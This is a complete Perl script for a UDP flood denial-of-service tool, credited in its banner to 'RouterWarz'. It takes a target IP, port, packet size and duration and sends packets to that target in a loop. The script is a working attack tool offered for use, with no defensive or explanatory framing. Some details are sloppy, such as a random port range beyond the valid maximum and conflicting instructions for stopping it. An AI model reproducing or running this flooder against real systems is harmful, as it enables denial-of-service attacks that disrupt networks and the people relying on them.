#!/usr/bin/perl
#Command: perl xmas.pl IP PORT 65500 TIME
use Socket;
use strict;
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "DDoS Command: perl xmas.pl IP PORT 65500 TIME $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print <<EOTEXT;
++++-++-+--++-+   
���+� � -+-+� �   
++++-++-+-+-+-+   
-+-+              
�+-+              
-+-+              
++ +-+-++++-+     
+-++� ����� -     
+-++-+-++++-+     
+-++-++-++-++-++-+
 �� ��� �+-++�  ��
--+--++-++-++-+--+
Created by RouterWarz
______________________

Welcome To xmas
______________________

IP/URL: $ip
PORT: $port
THREADS: $size
TIME: $time seconds
_______________________

How to stop the attack?

Do CTRL C
_______________________

EOTEXT
print "Stop with CTRL+Z\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
